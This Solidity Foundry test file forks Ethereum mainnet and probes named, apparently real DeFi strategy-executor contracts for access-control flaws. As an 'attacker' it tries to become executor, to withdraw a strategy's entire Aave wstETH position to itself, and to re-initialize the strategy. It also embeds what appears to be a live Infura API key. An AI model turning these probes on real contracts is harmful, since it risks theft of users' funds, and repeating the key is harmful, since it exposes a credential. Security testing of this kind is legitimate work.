// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IStrategyExecutor {
    function executors(address) external view returns (bool);
    function owner() external view returns (address);
    function updateExecutor(address executor, bool isActive) external;
    function executeOnStrategy(
        uint _strategyId,
        bytes4[] calldata _actionIds,
        bytes[] calldata _actionCalldata,
        uint8[][] memory _paramMapping
    ) external payable;
}

interface IStrategyStorage {
    function strategyExecutor() external view returns (address);
    function owner() external view returns (address);
    function updateStrategyExecutor(address newExecutor) external;
    function updateOwner(address newOwner) external;
    function strategies(uint256) external view returns (address);
    function getStrategy(uint256 _strategyId) external view returns (address);
}

interface IStrategy {
    function execute(address _target, bytes memory _data) external payable returns (bytes32);
    function callExecute(address _target, bytes memory _data) external payable returns (bytes32);
    function vault() external view returns (address);
    function strategyStorage() external view returns (address);
}

interface IActionExecutor {
    function executeActions(
        bytes4[] calldata _actionIds,
        bytes[] calldata _actionCallData,
        uint8[][] calldata _paramMapping
    ) external payable;
}

interface IActionRegistry {
    function getAddr(bytes4 _id) external view returns (address);
    function getActionInfo(bytes4 _id) external view returns (address, bool);
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
}

contract ExecutorExploit is Test {
    address constant STRATEGY_EXECUTOR = 0x89f57D3617F6a9FF877fEa34Dd0688b2840Ef50e;
    address constant STRATEGY_STORAGE = 0x97c03F52244E60BB18511Cbf03f890D5886f1F47;
    address constant STRATEGY_0 = 0x60d2D94aCB969CA54e781007eE89F04c1A2e5943;
    address constant ACTION_EXECUTOR = 0xb1593193Bcd7CEcc3d19597658003d735D1e9E94;
    address constant ACTION_REGISTRY = 0x94aF5994EB6841e1D930C95AD0C9F89771c3073F;
    address constant VAULT = 0x551d155760ae96050439AD24Ae98A96c765d761B;
    
    address constant wstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address constant aWstETH = 0x0B925eD163218f6662a35e0f0371Ac234f9E9371;
    
    // Action IDs
    bytes4 constant AAVE_WITHDRAW_ID = 0x72a6498a;
    bytes4 constant VAULT_PULL_ID = 0xfebcb52a;
    
    string RPC_URL = "https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c";
    address attacker;

    function setUp() public {
        vm.createSelectFork(RPC_URL);
        attacker = makeAddr("attacker");
        vm.deal(attacker, 100 ether);
    }

    function test_AnalyzeStrategyExecutor() public view {
        console.log("=== STRATEGY EXECUTOR ANALYSIS ===\n");
        
        console.log("StrategyExecutor:", STRATEGY_EXECUTOR);
        console.log("StrategyStorage:", STRATEGY_STORAGE);
        
        // Check owner
        address owner = IStrategyExecutor(STRATEGY_EXECUTOR).owner();
        console.log("Executor owner:", owner);
        
        address storageOwner = IStrategyStorage(STRATEGY_STORAGE).owner();
        console.log("Storage owner:", storageOwner);
        
        // Check executor from storage
        address executor = IStrategyStorage(STRATEGY_STORAGE).strategyExecutor();
        console.log("Storage.strategyExecutor():", executor);
        
        // Check if any public addresses are executors
        address[] memory testAddresses = new address[](5);
        testAddresses[0] = address(0);
        testAddresses[1] = owner;
        testAddresses[2] = VAULT;
        testAddresses[3] = ACTION_EXECUTOR;
        testAddresses[4] = attacker;
        
        for (uint i = 0; i < testAddresses.length; i++) {
            bool isExecutor = IStrategyExecutor(STRATEGY_EXECUTOR).executors(testAddresses[i]);
            if (isExecutor) {
                console.log("Found executor:", testAddresses[i]);
            }
        }
    }
    
    function test_TryBecomingExecutor() public {
        console.log("=== TRYING TO BECOME EXECUTOR ===\n");
        
        vm.startPrank(attacker);
        
        // Try calling updateExecutor (should fail - onlyOwner)
        try IStrategyExecutor(STRATEGY_EXECUTOR).updateExecutor(attacker, true) {
            console.log("CRITICAL: Became executor!");
        } catch Error(string memory reason) {
            console.log("updateExecutor failed:", reason);
        } catch (bytes memory) {
            console.log("updateExecutor failed (no message)");
        }
        
        // Check if we became executor
        bool isExecutor = IStrategyExecutor(STRATEGY_EXECUTOR).executors(attacker);
        console.log("Attacker is executor:", isExecutor);
        
        vm.stopPrank();
    }
    
    function test_AnalyzeActionRegistry() public view {
        console.log("=== ACTION REGISTRY ANALYSIS ===\n");
        
        console.log("ActionRegistry:", ACTION_REGISTRY);
        
        // Check some action IDs
        bytes4[] memory actionIds = new bytes4[](6);
        actionIds[0] = 0x72a6498a; // AaveV3Withdraw
        actionIds[1] = 0xfc33bf00; // AaveV3Supply
        actionIds[2] = 0xfebcb52a; // VaultPull
        actionIds[3] = 0xacd039ef; // LidoUnwrap
        actionIds[4] = 0x43142355; // LidoWrap
        actionIds[5] = 0xd7e40b2d; // LidoStake
        
        string[6] memory names = ["AaveV3Withdraw", "AaveV3Supply", "VaultPull", "LidoUnwrap", "LidoWrap", "LidoStake"];
        
        for (uint i = 0; i < actionIds.length; i++) {
            address actionAddr = IActionRegistry(ACTION_REGISTRY).getAddr(actionIds[i]);
            console.log(names[i], ":", actionAddr);
            
            if (actionAddr != address(0)) {
                // Check if the action itself has any interesting functions
                uint256 codeSize = actionAddr.code.length;
                console.log("  Code size:", codeSize);
            }
        }
    }
    
    function test_AnalyzeParamMapping() public view {
        console.log("=== PARAM MAPPING ANALYSIS ===\n");
        
        // DeFiSaver param mapping:
        // 0 = NO_PARAM_MAPPING (use direct value)
        // 1-127 = use return value from action at (value - 1) index
        // 128 = RETURN_PARAM_INDEX (special)
        // 129 = SUB_PARAM_INDEX (subscription param)
        // 255 = SENDER_ADDR (msg.sender of the transaction)
        
        // The key is: can we control what's returned by an action?
        // Or can we somehow inject a return value?
        
        console.log("Param mapping constants:");
        console.log("  NO_PARAM_MAPPING: 0");
        console.log("  Return values: 1-127");
        console.log("  RETURN_PARAM_INDEX: 128");
        console.log("  SUB_PARAM_INDEX: 129");
        console.log("  SENDER_ADDR: 255");
        
        // If SENDER_ADDR (255) can be used for the "to" parameter in AaveWithdraw,
        // the action would use msg.sender as destination
        // But msg.sender during action execution is Strategy (due to delegatecall chain)
    }
    
    function test_ExecuteOnStrategyDirect() public {
        console.log("=== TRYING DIRECT EXECUTE ON STRATEGY ===\n");
        
        vm.startPrank(attacker);
        
        uint256 strategyATokensBefore = IERC20(aWstETH).balanceOf(STRATEGY_0);
        console.log("Strategy aWstETH before:", strategyATokensBefore / 1e18);
        
        // Prepare AaveWithdraw action
        // Action params for AaveV3Withdraw:
        // struct Params {
        //     address tokenAddr;      // Asset to withdraw
        //     uint256 amount;         // Amount (type(uint256).max for all)
        //     address to;             // Recipient
        //     uint8 useDefaultMarket;
        //     address nullAddress;    // Unused
        // }
        
        bytes memory aaveWithdrawData = abi.encode(
            wstETH,                 // tokenAddr
            type(uint256).max,      // amount - all
            attacker,               // to - attacker!
            uint8(0),               // useDefaultMarket
            address(0)              // nullAddress
        );
        
        bytes4[] memory actionIds = new bytes4[](1);
        actionIds[0] = AAVE_WITHDRAW_ID;
        
        bytes[] memory actionCalldata = new bytes[](1);
        actionCalldata[0] = aaveWithdrawData;
        
        // paramMapping: all zeros = use direct params
        uint8[][] memory paramMapping = new uint8[][](1);
        paramMapping[0] = new uint8[](5);
        
        // Try calling executeOnStrategy (should fail - not executor)
        try IStrategyExecutor(STRATEGY_EXECUTOR).executeOnStrategy(
            0,  // strategyId = 0
            actionIds,
            actionCalldata,
            paramMapping
        ) {
            console.log("CRITICAL: executeOnStrategy succeeded!");
        } catch Error(string memory reason) {
            console.log("executeOnStrategy failed:", reason);
        } catch (bytes memory data) {
            console.log("executeOnStrategy failed (raw):");
            if (data.length > 0) {
                console.logBytes(data);
            }
        }
        
        uint256 strategyATokensAfter = IERC20(aWstETH).balanceOf(STRATEGY_0);
        uint256 attackerWstETH = IERC20(wstETH).balanceOf(attacker);
        
        console.log("Strategy aWstETH after:", strategyATokensAfter / 1e18);
        console.log("Attacker wstETH:", attackerWstETH / 1e18);
        
        vm.stopPrank();
    }
    
    function test_AnalyzeStrategyFunctions() public view {
        console.log("=== STRATEGY FUNCTION ANALYSIS ===\n");
        
        // Check what functions Strategy has
        bytes memory strategyCode = STRATEGY_0.code;
        console.log("Strategy code size:", strategyCode.length);
        
        // Common function selectors to look for:
        bytes4[10] memory selectors = [
            bytes4(keccak256("execute(address,bytes)")),
            bytes4(keccak256("callExecute(address,bytes)")),
            bytes4(keccak256("vault()")),
            bytes4(keccak256("strategyStorage()")),
            bytes4(keccak256("initialize()")),
            bytes4(keccak256("owner()")),
            bytes4(keccak256("transferOwnership(address)")),
            bytes4(keccak256("renounceOwnership()")),
            bytes4(keccak256("upgradeTo(address)")),
            bytes4(keccak256("upgradeToAndCall(address,bytes)"))
        ];
        
        string[10] memory names = [
            "execute",
            "callExecute", 
            "vault",
            "strategyStorage",
            "initialize",
            "owner",
            "transferOwnership",
            "renounceOwnership",
            "upgradeTo",
            "upgradeToAndCall"
        ];
        
        for (uint i = 0; i < selectors.length; i++) {
            console.log(names[i], "selector:");
            console.logBytes4(selectors[i]);
        }
    }
    
    function test_TryInitializeStrategy() public {
        console.log("=== TRYING TO INITIALIZE/REINITIALIZE STRATEGY ===\n");
        
        vm.startPrank(attacker);
        
        // Try various initialization patterns
        bytes4[] memory initSelectors = new bytes4[](4);
        initSelectors[0] = bytes4(keccak256("initialize()"));
        initSelectors[1] = bytes4(keccak256("initialize(address)"));
        initSelectors[2] = bytes4(keccak256("init()"));
        initSelectors[3] = bytes4(keccak256("setup()"));
        
        for (uint i = 0; i < initSelectors.length; i++) {
            (bool success, bytes memory data) = STRATEGY_0.call(
                abi.encodeWithSelector(initSelectors[i], attacker)
            );
            if (success) {
                console.log("Init succeeded with selector:", i);
                console.logBytes(data);
            }
        }
        
        vm.stopPrank();
    }
}
